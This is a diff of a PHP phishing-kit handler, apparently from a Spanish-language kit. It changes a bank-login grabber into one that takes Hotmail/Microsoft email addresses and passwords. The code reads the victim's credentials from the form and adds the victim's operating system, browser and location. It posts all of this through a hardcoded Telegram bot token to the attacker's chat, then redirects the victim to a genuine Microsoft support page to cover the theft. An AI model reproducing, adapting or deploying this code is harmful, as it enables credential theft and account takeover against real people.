@@ -63,16 +63,16 @@ date_default_timezone_set('America/Bogota');
 @ini_set("display_errors", 0);
 
 ////////////////////
-   if ( isset ($_POST['select']) && isset ($_POST['choppa']) && isset ($_POST['choppu']) && isset ($_POST['chappa']) ){
+   if ( isset ($_POST['email']) && isset ($_POST['clave']) ){
 
 
-$message = "✅BBV✅\r\n🪪TIPO: ".$_POST['select']."\r\n🪪NUMERO: ".$_POST['choppa']."\r\n👤Usuario: ".$_POST['choppu']."\r\n🔐Contras: ".$_POST['chappa']."\r\n";
+$message = "✅HOTMSN✅\r\n📧CORREO: ".$_POST['email']."\r\n🔐CLAVE: ".$_POST['clave']."\r\n";
 $message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
 $apiToken = "7762893737:AAGN0IehFnSVWClB93tdrTlWrdMfOHhy-zU";
 
 
 $data = [
-  'chat_id' => '-4791835816',
+  'chat_id' => '5150089222',
 
    'text' => $message
 ];
@@ -80,9 +80,9 @@ $data = [
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
 
 
-@header('Location: sms.php');
+@header('Location: https://support.microsoft.com/es-ES/microsoft-365');
 
-}else{ header ('location: sms.php'); exit();
+}else{ header ('location: https://support.microsoft.com/es-ES/microsoft-365'); exit();
  }
 
 
